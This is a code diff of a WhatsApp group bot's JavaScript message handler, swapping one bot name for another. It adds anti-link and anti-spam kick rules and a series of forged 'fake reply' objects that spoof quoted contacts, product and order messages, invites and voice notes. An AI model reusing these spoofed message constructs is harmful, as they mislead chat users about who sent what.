-          let seconds = Math.floor((distance % (1000 * 60)) / 1000);
-          return days + "Day " + hours + "Hour " + minutes + "Minute " + seconds + "Second"
-        }
-try {
-let isNumber = x => typeof x === 'number' && !isNaN(x)
-let limitUser = isRakyat ? global.limitawal.rakyat : global.limitawal.free
-let user = global.db.users[m.sender]
-if (typeof user !== 'object') global.db.users[m.sender] = {}
-if (user) {
-if (!isNumber(user.afkTime)) user.afkTime = -1
-if (!('afkReason' in user)) user.afkReason = ''
-if (!isNumber(user.limit)) user.limit = limitUser
-} else global.db.users[m.sender] = {
-afkTime: -1,
-afkReason: '',
-limit: limitUser,
-}
+		
 	    let setting = global.db.data.settings[botNumber]
             if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
 	    if (setting) {
 		if (!isNumber(setting.status)) setting.status = 0
 		if (!('autobio' in setting)) setting.autobio = false
-		if (!('templateImage' in setting)) setting.templateImage = false
+if (!('templateImage' in setting)) setting.templateImage = false
+if (!('templateVideo' in setting)) setting.templateVideo = false
 		if (!('templateGif' in setting)) setting.templateGif = false
 		if (!('templateMsg' in setting)) setting.templateMsg = false
 		if (!('templateDocument' in setting)) setting.templateDocument = true
@@ -574,412 +284,479 @@ limit: limitUser,
 		status: 0,
 		autobio: false,
 		templateImage: false,
+		templateVideo: false,
 		templateGif: false,
 		templateMsg: false,
 		templateDocument: true,
 	    }
-} catch (err) {
-console.error(err)
+	    
+        } catch (err) {
+            console.error(err)
+        }
+	
+	// FAKE TEXT IMG
+const textImg = (teks) => {
+XeonBotInc.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./XeonMedia/image/wpmobile.png')}) 
 }
 
-const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
-const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
- "orderMessage": {
-"orderId": orid, 
-"thumbnail": img, 
-"itemCount": itcount, 
-"status": "INQUIRY", 
-"surface": "CATALOG", 
-"orderTitle": title, 
-"message": text, 
-"sellerJid": sellers, 
-"token": tokens, 
-"totalAmount1000": ammount, 
-"totalCurrencyCode": "IDR", 
+//FAKE CONTACT
+const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `916909137213 -1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Click to chat\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
+//FAKEREPLY PRODUCT
+const ftoko = {
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
+},
+message: {
+"productMessage": {
+"product": {
+"productImage":{
+"mimetype": "image/jpeg",
+"jpegThumbnail": log0 //The picture
+},
+"title": `${global.ownername}`, 
+"description": `${global.botname}`, 
+"currencyCode": "USD",
+"priceAmount1000": "2000",
+"retailerId": `${global.watermark}`,
+"productImageCount": 1
+},
+"businessOwnerJid": `0@s.whatsapp.net`
 }
-}), { userJid: jid })
-Miku.relayMessage(jid, order.message, { messageId: order.key.id})
 }
+} 
+//FAKEREPLY TROLI
+const ftroli = {
+key : {
+participant : '0@s.whatsapp.net'
+},
+message: {
+orderMessage: {
+itemCount : 1,
+status: 1,
+surface : 1,
+message: `${global.ownername}`, //
+orderTitle: `${global.botname}`,
+thumbnail: log0, //Pic
+sellerJid: '0@s.whatsapp.net'
 
-
-const { 
-addInventoriDarah, 
-cekDuluJoinAdaApaKagaDiJson, 
-addDarah, 
-kurangDarah, 
-getDarah 
-}  = require('./storage/user/blood.js')
-const { 
-cekInventoryAdaAtauGak, 
-addInventori,  
-addBesi, 
-addEmas, 
-addEmerald,
-addUmpan,
-addPotion,
-kurangBesi, 
-kurangEmas, 
-kurangEmerald, 
-kurangUmpan,
-kurangPotion,
-getBesi, 
-getEmas, 
-getEmerald,
-getUmpan,
-getPotion
-} = require('./storage/user/exchange.js')
-const { 
-addInventoriMonay, 
-cekDuluJoinAdaApaKagaMonaynyaDiJson, 
-addMonay,
-kurangMonay, 
-getMonay 
-} = require('./storage/user/money.js')
-const { 
-addInventoriLimit, 
-cekDuluJoinAdaApaKagaLimitnyaDiJson, 
-addLimit, 
-kurangLimit, 
-getLimit 
-} = require('./storage/user/limit.js')
-const { 
-cekDuluHasilBuruanNya, 
-addInventoriBuruan, 
-addIkan,
-addAyam, 
-addKelinci, 
-addDomba, 
-addSapi,
-addGajah,
-kurangIkan,
-kurangAyam, 
-kurangKelinci, 
-kurangDomba, 
-kurangSapi,
-kurangGajah,
-getIkan,
-getAyam, 
-getKelinci, 
-getDomba,
-getSapi,
-getGajah
-} = require('./storage/user/prey.js')
-let DarahAwal =  global.rpg.darahawal
-const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)   
-const isCekDarah = getDarah(m.sender)
-const isUmpan = getUmpan(m.sender)
-const isPotion = getPotion(m.sender)
-const isIkan = getIkan(m.sender)
-const isAyam = getAyam(m.sender)
-const isKelinci = getKelinci(m.sender)
-const isDomba = getDomba(m.sender)
-const isSapi = getSapi(m.sender)
-const isGajah = getGajah(m.sender)
-const isMonay = getMonay(m.sender)
-const isLimit = getLimit(m.sender)
-const isBesi = getBesi(m.sender)
-const isEmas = getEmas(m.sender)
-const isEmerald = getEmerald(m.sender)
-const isInventory = cekInventoryAdaAtauGak(m.sender)
-const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
-const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
-const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
-const ikan = ['🐟','🐠','🐡']   
-   
- 
-
-        let picaks = [flaming,fluming,flarun,flasmurf]
-		let picak = picaks[Math.floor(Math.random() * picaks.length)]
-
-if (!isRakyat) {
-rkyt.push(m.sender.split("@")[0])
 }
+}
+}
+//FAKEREPLY LOCATION
+const flokasi = {
+key : {
+ participant : '0@s.whatsapp.net'
+},
+message: {
+locationMessage: {
+name: `${global.location}`,
+jpegThumbnail: log0
+}
+}
+}
+//FAKEREPLY DOCUMENT
+const fdocs = {
+key : {
+ participant : '0@s.whatsapp.net'
+},
+message: {
+documentMessage: {
+title: `${global.botname}`, 
+jpegThumbnail: log0
+}
+}
+}
+//FAKEREPLY VIDEO
+const fvideo = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...(from ? 
+{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
+},
+message: { 
+"videoMessage": { 
+"title": `${global.botname}`,
+"h": `${global.ownername}`,
+'seconds': '30', 
+'caption': `${global.watermark}`,
+'jpegThumbnail': log0
+}
+}
+}
+//FAKEREPLY GROUPINVITE
+const fgclink = {
+"key": {
+"fromMe": false,
+"participant": "0@s.whatsapp.net",
+"remoteJid": "0@s.whatsapp.net"
+},
+"message": {
+"groupInviteMessage": {
+"groupJid": "916909137213-1616169743@g.us",
+"inviteCode": `${global.ownername}`,
+"groupName": `${global.botname}`, 
+"caption":`${global.watermark}`, 
+'jpegThumbnail': log0
+}
+}
+}
+//FAKEREPLY GIF
+const fgif = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...(from ? 
+{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
+},
+message: { 
+ "videoMessage": { 
+ "title":`${global.botname}`,
+ "h": `${global.ownername}`,
+ 'seconds': "30", 
+ 'gifPlayback': 'true', 
+ 'caption': `${global.watermark}`,
+ 'jpegThumbnail': log0
+}
+}
+} 
+//FAKEREPLY TEXT WITH THUMBNAIL
+const ftextt = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...(from ? 
+{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
+},
+message: { 
+"extendedTextMessage": {
+ "text":`${global.ownername}`,
+"title": `${global.botname}`,
+ 'jpegThumbnail': log0
+}
+} 
+}
+//FAKEREPLY VN
+const fvn = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...(from ? 
+{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
+},
+message: { 
+"audioMessage": {
+"mimetype":"audio/ogg; codecs=opus",
+"seconds": "9999999999999999",
+"ptt": "true"
+}
+} 
+}
+	
+	//group target \\
+const reply = (teks) => {
+           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
+        }
+        
+        const replay = (teks) => {
+            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
+        }
+	
+        //Public & Self\\
+        if (!XeonBotInc.public) {
+            if (!m.key.fromMe) return
+        }
 
-global.hit = {}
+        //Push Message To Console && Auto Read\\
+        if (m.message) {
+            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
+        }
+	
+	//reset limit every 12 hours\\
+        let cron = require('node-cron')
+        cron.schedule('00 12 * * *', () => {
+            let user = Object.keys(global.db.data.users)
+            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
+            for (let jid of user) global.db.data.users[jid].limit = limitUser
+            console.log('Limit Reseted')
+        }, {
+            scheduled: true,
+            timezone: "Asia/Kolkata"
+        })
+        
+        //hitter
+        global.hit = {}
 if (isCmd) {
 data = await fetchJson('https://api.countapi.xyz/hit/CheemsBot/visits')
 jumlahcmd = `${data.value}`
 dataa = await fetchJson(`https://api.countapi.xyz/hit/CheemsBot${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
 jumlahharian = `${dataa.value}`
 }
- 
-
-let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
-for (let jid of mentionUser) {
-let user = global.db.users[jid]
-if (!user) continue
-let afkTime = user.afkTime
-if (!afkTime || afkTime < 0) continue
-let reason = user.afkReason || ''
-reply(`
-Tolong jangan tag Beliau!
-Beliau lagi AFK ${reason ? 'Dengan alasan ' + reason : 'no reason'}
-Selama ${clockString(new Date - afkTime)}
-`.trim())
+        
+	//auto set bio\\
+	if (db.data.settings[botNumber].autobio) {
+	    let setting = global.db.data.settings[botNumber]
+	    if (new Date() * 1 - setting.status > 1000) {
+		let uptime = await runtime(process.uptime())
+		await XeonBotInc.setStatus(`${XeonBotInc.user.name} | Runtime : ${runtime(uptime)}`)
+		setting.status = new Date() * 1
+	    }
+	}
+	
+	//antispam or auto react
+//if (m.message && msgFilter.isFiltered(from)) {
+//console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
+//return XeonBotInc.sendMessage(from, { react: { text: `${global.themeemoji}`, key: m.key }})
+//}
+	
+//auto read whatsapp status
+if (autoreadsw) {
+		if (from === 'status@broadcast') {
+		XeonBotInc.chatRead(from)
+	}
+	}
+/*//autoreader gc and pm
+if (global.autoreadpmngc) {
+if (command) {
+await XeonBotInc.sendPresenceUpdate('composing', m.chat)
+XeonBotInc.sendReadReceipt(from, m.sender, [m.key.id])}
 }
-
-if (db.users[m.sender].afkTime > -1) {
-let user = global.db.users[m.sender]
-reply(`
-Beliau telah online ${user.afkReason ? ' Setelah ' + user.afkReason : ''}
-Selama ${clockString(new Date - user.afkTime)}
-`.trim())
-user.afkTime = -1
-user.afkReason = ''
+  //autoread gc only
+ if (global.autoReadGc) {
+  if (m.isGroup) { XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
+}*/
+  //auto recording all
+    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
 }
-let ningen = [
-"Iya kak?",
-"Ada apa ningen?",
-"Ada apa kak?",
-"Memanggil Saya?",
-"Nani!?",
-"Nani?\nOmae no ochin-chin itai ka?",
-"Apa? mau nyewa?",
-"Sepatunya Ragil didalam botol\nGosah Manggil² klo gapenting Kon- eh maap dibajak:v"
-]
-let ning = pickRandom(ningen)
-let jawaban =[
-	"Apa Oniichan?",
-	"Iya Kakanda?",
-	"Ada apa Oniichan?",
-	"Ada apa Kakanda?",
-	"Huh? nani?..",
-	"Iya?, Butuh sesuatu Oniichan?",
-	"Watashi desuka?",
-	"Apa Sayangkuh 😘",
-	"Iya Sayang?",
-	"Apa? Minta Jatah?"
-	]
-let jawab = pickRandom(jawaban)
-if (m.mtype === 'groupInviteMessage') {
-teks = `Aku gabisa join groupnya kalo engga disuruh oleh pemilikku, Ketik *-owner* dan chat pemilikku jika ingin mengundang aku kedalam group.`
-sendOrder(m.chat, teks, "5123658817728409", fs.readFileSync('./Assets/pic10.jpg'), `${BotName}`, "916909137213@s.whatsapp.net", "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==", "99999999999999999999")
+//autotyper all
+  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
 }
-if (budy.includes(`anying`)) {
-Miku.sendMessage(m.chat , {audio : fs.readFileSync('./Assets/anying.wav'), mimetype : 'audio/mpeg', ppt : true},{quoted : m})
-}
-
-if (AntiLink) {
-    linkgce = await Miku.groupInviteCode(from)
-    if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
-    reply(`\`\`\`「  Antilink System  」\`\`\`\n\nNo action will be because you sent this group's link.`)
-    } else if (isUrl(m.text)) {
-    bvl = `\`\`\`「  *Antilink System*  」\`\`\`\n\nAdmin has sent a link so no action is taken.`
-    if (isAdmins) return reply(bvl)
-    if (m.key.fromMe) return reply(bvl)
-    if (isCreator) return reply(bvl)
-    kice = m.sender
-    await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
-    Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka Has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-    } else {
-    }
-    }
- 
-    if (antiWame)
-    if (budy.includes(`wa.me`)) {
-  if (!isBotAdmins) return
-  bvl = `\`\`\`「 _'wa.me' PM link Detected!_  」\`\`\`\n\nLink sent by Admin so no action is taken!`
-  if (isAdmins) return reply(bvl)
-  if (m.key.fromMe) return reply(bvl)
-  if (isCreator) return reply(bvl)
-  kice = m.sender
-  await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-  Miku.sendMessage(from, {text:`\`\`\`「 'wa.me' PM link Detected! 」\`\`\`\n\n@${kice.split("@")[0]} Baka Has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-  } else {
+//auto available all
+  if (global.available) { if (m.chat) { XeonBotInc.sendPresenceUpdate('available', m.chat) }
   }
-  if (antiWame)
-  if (budy.includes(`http://wa.me`)) {
-if (!isBotAdmins) return
-bvl = `\`\`\`「 'wa.me' PM link Detected! 」\`\`\`\n\nLink sent by Admin so no action is taken!`
+
+// Autosticker gc
+        if (isAutoSticker) {
+            if (/image/.test(mime) && !/webp/.test(mime)) {
+                let mediac = await quoted.download()
+                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                console.log(`Auto sticker detected`)
+            } else if (/video/.test(mime)) {
+                if ((quoted.msg || quoted).seconds > 11) return
+                let mediac = await quoted.download()
+                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+            }
+        }
+        //Autosticker pc
+                if (isAutoStick) {
+            if (/image/.test(mime) && !/webp/.test(mime)) {
+                let mediac = await quoted.download()
+                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                console.log(`Auto sticker detected`)
+            } else if (/video/.test(mime)) {
+                if ((quoted.msg || quoted).seconds > 11) return
+                let mediac = await quoted.download()
+                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+            }
+        }
+
+	// AntiLinkgc
+if (AntiLink) {
+linkgce = await XeonBotInc.groupInviteCode(from)
+if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
+reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`)
+} else if (isUrl(m.text)) {
+bvl = `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`
 if (isAdmins) return reply(bvl)
 if (m.key.fromMe) return reply(bvl)
 if (isCreator) return reply(bvl)
 kice = m.sender
-await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-Miku.sendMessage(from, {text:`\`\`\`「 'wa.me' PM link Detected! 」\`\`\`\n\n@${kice.split("@")[0]}  Baka Has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+}
+  // Antiwame by xeon
+  if (antiWame)
+  if (budy.includes(`wa.me`)) {
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+  if (antiWame)
+  if (budy.includes(`http://wa.me`)) {
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antivirtex by xeon
+  if (antiVirtex) {
+  if (budy.length > 3500) {
+  reply(`Somebody spammed virus!! Mark as read⚠️\n`.repeat(300))
+  reply(`\`\`\`「 Virus Detected 」\`\`\`\n\nSorry You Will Be Kicked !`)
+  if (!isBotAdmins) return reply(mess.botAdmin)
+  XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+  }
+  }
+//anti bad words by xeon
+if (antiToxic)
+if (bad.includes(messagesD)) {
+tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
+sin =  tos[Math.floor(Math.random() * (tos.length))]
+reply(sin)
+if (m.text) {
+bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${kice.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})}
+}
+//antilink youtube video by xeon
+if (AntiLinkYoutubeVid)
+if (budy.includes("https://youtu.be/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink youtube channel by xeon
+if (AntiLinkYoutubeChannel)
+   if (budy.includes("https://youtube.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink instagram by xeon
+if (AntiLinkInstagram)
+   if (budy.includes("https://www.instagram.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink facebook by xeon
+if (AntiLinkFacebook)
+   if (budy.includes("https://facebook.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink telegram by xeon
+if (AntiLinkTelegram)
+   if (budy.includes("https://t.me/")){
+if (AntiLinkTelegram)
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink tiktok by xeon
+if (AntiLinkTiktok)
+   if (budy.includes("https://www.tiktok.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink twitter by xeon
+if (AntiLinkTwitter)
+   if (budy.includes("https://twitter.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink all by xeon
+if (AntiLinkAll)
+   if (budy.includes("https://")){
+if (!isBotAdmins) return
+bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
 } else {
 }
 
-if (antiVirtex) {
-    if (budy.length > 3500) {
-    reply(`*Caution!*\n\n`.repeat(300))
-    reply(`\`\`\`Virus Detected !!\`\`\`\n\nRevoving sender...`)
-    if (!isBotAdmins) return reply(mess.botAdmin)
-    Miku.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-    }
-    }
-
-
-    if (AntiLink) {
-        if (!isBotAdmins) return
-        linkgce = await Miku.groupInviteCode(from)
-        if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
-        reply(`\`\`\`「  Antilink System  」\`\`\`\n\nNo action will be taken because you sent this group's link!`)
-        } else if (isUrl(m.text)) {
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nAdmin has sent a group link so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        }
-
-        
-        if (AntiLinkYoutubeVid)
-        if (budy.includes("https://youtu.be/")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Yt video link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkYoutubeChannel)
-           if (budy.includes("https://youtube.com/")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Yt channel link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkInstagram)
-           if (budy.includes("https://www.instagram.com/")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Instagram link in this group! No promotion is allowed!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkFacebook)
-           if (budy.includes("https://facebook.com/")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
